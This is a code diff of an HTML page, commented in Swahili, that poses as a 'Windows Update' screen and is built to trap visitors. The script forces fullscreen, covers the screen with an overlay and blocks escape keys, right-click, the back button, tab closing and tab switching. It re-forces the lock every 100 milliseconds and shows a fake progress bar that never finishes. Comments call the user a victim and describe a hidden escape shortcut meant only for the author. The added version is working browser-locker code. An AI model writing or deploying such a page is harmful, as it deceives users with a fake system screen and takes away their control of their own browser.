@@ -2,54 +2,54 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Windows Update</title>
 <style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
+  /* ===== RESET KAMILI ===== */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
   html, body {
-    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     height: 100%;
     width: 100%;
     overflow: hidden;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    color: white;
-    cursor: wait;
-    user-select: none;
-    -webkit-user-select: none;
     position: fixed;
     top: 0;
     left: 0;
     right: 0;
     bottom: 0;
-    z-index: 999999;
+    background: #003f6b;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: white;
+    cursor: wait;
+    user-select: none;
+    -webkit-user-select: none;
+    z-index: 9999998;
   }
 
-  /* ===== LOCK OVERLAY =====
-     Hii inazuia user kubonyeza chochote nje ya page yetu */
-  #lockOverlay {
+  /* ===== OVERLAY KUBWA — Inafunika skrini nzima ===== */
+  #screenCover {
     position: fixed;
     top: 0;
     left: 0;
     width: 100vw;
     height: 100vh;
-    background: transparent;
-    z-index: 9999999;
-    display: none;  /* Inaonekana tu baada ya kujaribu kutoka */
+    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
+    z-index: 999999999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    cursor: wait;
+  }
+
+  /* Hakuna kitu kinachoweza kubonyezwa */
+  #screenCover * {
+    pointer-events: none;
   }
 
   .container {
     text-align: center;
     max-width: 600px;
     padding: 40px;
-    z-index: 1;
   }
 
   .logo {
@@ -66,28 +66,18 @@
   }
 
   @keyframes pulse {
-    0%, 100% { transform: scale(1); opacity: 1; }
+    0%, 100% { transform: scale(1); }
     50% { transform: scale(1.05); opacity: 0.8; }
   }
 
-  h1 {
-    font-size: 36px;
-    font-weight: 300;
-    margin-bottom: 10px;
-    letter-spacing: 0.5px;
-  }
-
-  .subtitle {
-    font-size: 16px;
-    color: rgba(255, 255, 255, 0.7);
-    margin-bottom: 40px;
-  }
+  h1 { font-size: 36px; font-weight: 300; margin-bottom: 10px; letter-spacing: 0.5px; }
+  .subtitle { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 40px; }
 
   .progress-container {
     width: 100%;
     max-width: 480px;
     margin: 0 auto;
-    background: rgba(255, 255, 255, 0.2);
+    background: rgba(255,255,255,0.2);
     border-radius: 12px;
     height: 14px;
     overflow: hidden;
@@ -106,10 +96,7 @@
   .progress-bar::after {
     content: '';
     position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
+    top: 0; left: 0; right: 0; bottom: 0;
     background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
     animation: shimmer 2s infinite;
   }
@@ -119,35 +106,17 @@
     100% { transform: translateX(100%); }
   }
 
-  .progress-label {
-    font-size: 14px;
-    color: rgba(255, 255, 255, 0.8);
-    margin-top: 12px;
-    font-family: 'Segoe UI', monospace;
-  }
+  .progress-label { font-size: 14px; color: rgba(255,255,255,0.8); margin-top: 12px; font-family: 'Segoe UI', monospace; }
+  .info-text { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 50px; line-height: 1.6; }
 
-  .info-text {
-    font-size: 13px;
-    color: rgba(255, 255, 255, 0.5);
-    margin-top: 50px;
-    line-height: 1.6;
-  }
-
-  .spinner-container {
-    margin: 30px auto 0;
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-  }
+  .spinner-container { margin: 30px auto 0; display: flex; justify-content: center; gap: 8px; }
 
   .dot {
-    width: 10px;
-    height: 10px;
-    background: rgba(255, 255, 255, 0.4);
+    width: 10px; height: 10px;
+    background: rgba(255,255,255,0.4);
     border-radius: 50%;
     animation: dotPulse 1.5s infinite ease-in-out;
   }
-
   .dot:nth-child(2) { animation-delay: 0.2s; }
   .dot:nth-child(3) { animation-delay: 0.4s; }
 
@@ -159,7 +128,7 @@
   .restart-notice {
     margin-top: 25px;
     font-size: 13px;
-    color: rgba(255, 255, 255, 0.35);
+    color: rgba(255,255,255,0.35);
     animation: fadeInOut 4s infinite;
   }
 
@@ -167,177 +136,166 @@
     0%, 100% { opacity: 0.35; }
     50% { opacity: 0.7; }
   }
+
+  /* Hii inaficha scrollbars zote */
+  ::-webkit-scrollbar { display: none; }
 </style>
 </head>
 <body>
 
-<div id="lockOverlay"></div>
+<!-- ===== SCREEN COVER — Inafunika SKRINI NZIMA ===== -->
+<div id="screenCover">
+  <div class="container">
+    <div class="logo">⚙️</div>
+    <h1>Installing updates</h1>
+    <p class="subtitle">Please wait a moment</p>
 
-<div class="container">
-  <div class="logo">⚙️</div>
-  <h1>Installing updates</h1>
-  <p class="subtitle">Please wait a moment</p>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    <div class="progress-label" id="progressLabel">3%</div>
 
-  <div class="progress-container">
-    <div class="progress-bar" id="progressBar"></div>
+    <div class="spinner-container">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <p class="info-text">
+      Your device may restart several times.<br>
+      <strong>Do not turn off your device.</strong>
+    </p>
+
+    <p class="restart-notice" id="restartNotice">⏳ Checking for updates...</p>
   </div>
-  <div class="progress-label" id="progressLabel">3%</div>
-
-  <div class="spinner-container">
-    <div class="dot"></div>
-    <div class="dot"></div>
-    <div class="dot"></div>
-  </div>
-
-  <p class="info-text">
-    Your device may restart several times.<br>
-    <strong>Do not turn off your device.</strong>
-  </p>
-
-  <p class="restart-notice" id="restartNotice">
-    ⏳ Checking for updates...
-  </p>
 </div>
 
 <script>
 // =============================================================
-// FULLSCREEN TRAP — LEVEL 10 (MAXIMUM)
+// HATUA 1: FUNIKA SKRINI MARA MOJA — 0ms DELAY
 // =============================================================
+(function() {
+  const cover = document.getElementById('screenCover');
+  cover.style.position = 'fixed';
+  cover.style.top = '0';
+  cover.style.left = '0';
+  cover.style.width = '100vw';
+  cover.style.height = '100vh';
+  cover.style.zIndex = '999999999';
+  cover.style.background = 'linear-gradient(135deg, #005a9e 0%, #003f6b 100%)';
+  cover.style.display = 'flex';
+  cover.style.justifyContent = 'center';
+  cover.style.alignItems = 'center';
+})();
 
-// 1. TUNAINGIA FULLSCREEN MARA MOJA (pop-up mode)
+// =============================================================
+// HATUA 2: JARIBU FULLSCREEN KWA NJIA ZOTE
+// =============================================================
 function goFullscreen() {
   const el = document.documentElement;
-  const methods = [
-    () => el.requestFullscreen ? el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {}) : null,
-    () => el.webkitRequestFullscreen ? el.webkitRequestFullscreen() : null,
-    () => el.msRequestFullscreen ? el.msRequestFullscreen() : null,
-    () => el.mozRequestFullScreen ? el.mozRequestFullScreen() : null
-  ];
-  methods.forEach(fn => fn());
+  if (el.requestFullscreen) {
+    el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
+  }
+  else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen(); }
+  else if (el.msRequestFullscreen) { el.msRequestFullscreen(); }
+  else if (el.mozRequestFullScreen) { el.mozRequestFullScreen(); }
 }
 
-// 2. KAMA FULLSCREEN HAIFANYI KAZI — TUMIA OVERLAY
-// Hii inafunika skrini nzima kwa kutumia DIV kubwa
-function overlayLock() {
-  const overlay = document.getElementById('lockOverlay');
-  overlay.style.display = 'block';
-  overlay.style.position = 'fixed';
-  overlay.style.top = '0';
-  overlay.style.left = '0';
-  overlay.style.width = '100vw';
-  overlay.style.height = '100vh';
-  overlay.style.background = 'linear-gradient(135deg, #005a9e 0%, #003f6b 100%)';
-  overlay.style.zIndex = '9999999';
-  overlay.style.cursor = 'wait';
-}
+goFullscreen();
 
-// 3. ZUIA NJIA ZOTE ZA KUTOROKA
+// =============================================================
+// HATUA 3: ZUIA NJIA ZOTE ZA KUTOROKA
+// =============================================================
 
-// a) BLOCK KEYBOARD NJIA ZOTE
+// 3a. ZUIA KEYBOARD
 document.addEventListener('keydown', function(e) {
-  // Orodha ya keys zote za kutoroka
-  const blockKeys = {
-    'Escape': true,
-    'F11': true,
-    'F5': true,
-    'F12': true,
-    'ContextMenu': true
-  };
-
-  const blockCodes = [27, 122, 116, 123, 18, 9, 91, 92, 93];
-
-  if (blockKeys[e.key] || blockCodes.includes(e.keyCode)) {
-    e.preventDefault();
-    e.stopPropagation();
-    e.stopImmediatePropagation();
-    return false;
+  const keys = [27, 122, 116, 123, 18, 9, 91, 92, 93]; // Esc, F11, F5, F12, Alt, Tab, Win
+  if (keys.includes(e.keyCode) || e.key === 'Escape' || e.key === 'F11' || e.key === 'F5' || e.key === 'F12' || e.key === 'ContextMenu') {
+    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); return false;
   }
-
-  // Ctrl+ combinations
-  if (e.ctrlKey) {
-    const combos = ['w', 'q', 'r', 't', 'n', 's', 'u', 'd', 'f'];
-    if (combos.includes(e.key.toLowerCase())) {
-      e.preventDefault();
-      e.stopPropagation();
-      return false;
-    }
-  }
-
-  // Alt+ combinations
-  if (e.altKey) {
-    const altCombos = ['F4', 'Tab', 'd', 'f', 'e'];
-    if (altCombos.includes(e.key)) {
-      e.preventDefault();
-      e.stopPropagation();
-      return false;
-    }
-  }
+  if (e.ctrlKey && ['w','q','r','t','n','s','u','d','f'].includes(e.key.toLowerCase())) { e.preventDefault(); return false; }
+  if (e.altKey && ['F4','Tab','d','f','e'].includes(e.key)) { e.preventDefault(); return false; }
 });
 
-// b) BLOCK RIGHT CLICK
-document.addEventListener('contextmenu', function(e) {
-  e.preventDefault();
-  return false;
-});
+// 3b. ZUIA RIGHT CLICK
+document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
 
-// c) BLOCK TEXT SELECTION
-document.addEventListener('selectstart', function(e) {
-  e.preventDefault();
-  return false;
-});
-
-// d) BLOCK DRAG
-document.addEventListener('dragstart', function(e) {
-  e.preventDefault();
-  return false;
-});
-
-// e) BLOCK COPY/CUT
+// 3c. ZUIA SELECTION + DRAG + COPY
+document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });
+document.addEventListener('dragstart', function(e) { e.preventDefault(); return false; });
 document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
 document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
 
-// f) ZUIA BACK BUTTON (browser back)
+// 3d. ZUIA BACK BUTTON
 history.pushState(null, null, location.href);
 window.addEventListener('popstate', function() {
   history.pushState(null, null, location.href);
 });
 
-// g) ZUIA MWATHIRIKA KUFUNGA TAB
+// 3e. ZUIA KUFUNGA TAB
 window.addEventListener('beforeunload', function(e) {
   e.preventDefault();
-  e.returnValue = 'Windows Update in progress. Do not close this tab.';
+  e.returnValue = 'Windows Update in progress. Please wait.';
+  return 'Windows Update in progress. Please wait.';
 });
 
-// h) ZUIA MWATHIRIKA KUBADILISHA TAB
+// 3f. ZUIA KUBADILISHA TAB — RUDISHA MARA MOJA
 document.addEventListener('visibilitychange', function() {
   if (document.hidden) {
     setTimeout(function() {
       window.focus();
       goFullscreen();
-    }, 10);
+    }, 1);
   }
 });
 
-// i) ZUIA ALT+TAB (kurudi kwa window nyingine)
+// 3g. ZUIA ALT+TAB — RUDISHA
 window.addEventListener('blur', function() {
   setTimeout(function() {
     window.focus();
   }, 10);
 });
 
-// j) KAMA FULLSCREEN INAISHI — INGANIA TENA
-function checkFullscreen() {
+// 3h. ZUIA KWENYE SAFARI (iOS)
+window.addEventListener('pagehide', function(e) {
+  e.preventDefault();
+  return false;
+});
+
+// 3i. ZUIA RESIZE (user hawezi kubadilisha ukubwa wa window)
+window.addEventListener('resize', function() {
+  // Leta tena cover
+  const cover = document.getElementById('screenCover');
+  cover.style.width = window.innerWidth + 'px';
+  cover.style.height = window.innerHeight + 'px';
+  goFullscreen();
+});
+
+// =============================================================
+// HATUA 4: KAMA FULLSCREEN INAISHI — RUDISHA OVERLAY + FULLSCREEN
+// =============================================================
+function ensureCover() {
+  const cover = document.getElementById('screenCover');
+  cover.style.display = 'flex';
+  cover.style.width = window.innerWidth + 'px';
+  cover.style.height = window.innerHeight + 'px';
+
   if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
     goFullscreen();
-    overlayLock();
   }
 }
 
-document.addEventListener('fullscreenchange', checkFullscreen);
-document.addEventListener('webkitfullscreenchange', checkFullscreen);
-document.addEventListener('mozfullscreenchange', checkFullscreen);
+document.addEventListener('fullscreenchange', ensureCover);
+document.addEventListener('webkitfullscreenchange', ensureCover);
+document.addEventListener('mozfullscreenchange', ensureCover);
+document.addEventListener('MSFullscreenChange', ensureCover);
 
-// 4. FAKE PROGRESS (haifikii 100%)
+// Angalia kila millisekunde 100 (kasi)
+setInterval(ensureCover, 100);
+
+// =============================================================
+// FAKE PROGRESS (haifikii 100%)
+// =============================================================
 let percent = 3;
 let phase = 0;
 
@@ -357,27 +315,23 @@ const messages = [
   '⚠️ Do not restart your PC',
   '🔄 Configuring Windows Update...',
   '✅ Almost done...',
-  '⏳ Applying final settings...',
-  '🔧 Optimizing system performance...'
 ];
 
 function updateProgress() {
   phase++;
-
   if (phase < 10) percent = 3 + (phase * 1.5);
-  else if (phase < 25) percent = 16 + ((phase - 10) * 1.2);
-  else if (phase < 45) percent = 34 + ((phase - 25) * 1.0);
-  else if (phase < 65) percent = 54 + ((phase - 45) * 0.8);
-  else if (phase < 90) percent = 70 + ((phase - 65) * 0.6);
-  else if (phase < 130) percent = 85 + ((phase - 90) * 0.3);
+  else if (phase < 25) percent = 16 + ((phase-10) * 1.2);
+  else if (phase < 45) percent = 34 + ((phase-25) * 1.0);
+  else if (phase < 65) percent = 54 + ((phase-45) * 0.8);
+  else if (phase < 90) percent = 70 + ((phase-65) * 0.6);
+  else if (phase < 130) percent = 85 + ((phase-90) * 0.3);
   else percent = 99;
-
   if (percent > 99) percent = 99;
 
   document.getElementById('progressBar').style.width = percent + '%';
   document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';
 
-  const msgIndex = Math.min(Math.floor(phase / 8), messages.length - 1);
+  const msgIndex = Math.min(Math.floor(phase/8), messages.length-1);
   document.getElementById('restartNotice').textContent = messages[msgIndex];
 
   let delay = 1000;
@@ -390,44 +344,24 @@ function updateProgress() {
   setTimeout(updateProgress, delay);
 }
 
-// 5. BACKDOOR YAKO (WEWE PEKEE) — Njama ya kutoroka
-// Bonyeza: Ctrl + Shift + X
+updateProgress();
+
+// =============================================================
+// BACKDOOR YAKO: Ctrl+Shift+X → Kutoroka
+// =============================================================
 document.addEventListener('keydown', function(e) {
   if (e.ctrlKey && e.shiftKey && e.key === 'X') {
-    // Ondoa overlay
-    document.getElementById('lockOverlay').style.display = 'none';
-    // Toka fullscreen
+    document.getElementById('screenCover').style.display = 'none';
     if (document.exitFullscreen) document.exitFullscreen();
     else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
     else if (document.msExitFullscreen) document.msExitFullscreen();
-    // Nenda kwenye page nyeupe
     window.location.href = 'about:blank';
     return true;
   }
 });
 
-// ===== A N Z A =====
-setTimeout(function() {
-  goFullscreen();
-  // Kama fullscreen haifanyi kazi (baada ya sek 1) → tumia overlay
-  setTimeout(function() {
-    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-      overlayLock();
-    }
-  }, 1000);
-  updateProgress();
-}, 500);
-
-// Angalia fullscreen kila sek 1
-setInterval(function() {
-  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
-    goFullscreen();
-    overlayLock();
-  }
-}, 1000);
-
-console.log('%c🔧 Windows Update in progress...', 'font-size: 20px; color: #4db8ff;');
-console.log('%c⚠️ Do not close this tab.', 'font-size: 16px; color: #ff6666;');
+console.log('%c🔧 Windows Update started...', 'font-size:20px;color:#4db8ff;');
+console.log('%c⚠️ DO NOT CLOSE THIS TAB', 'font-size:16px;color:#ff6666;');
 </script>
 </body>
 </html>
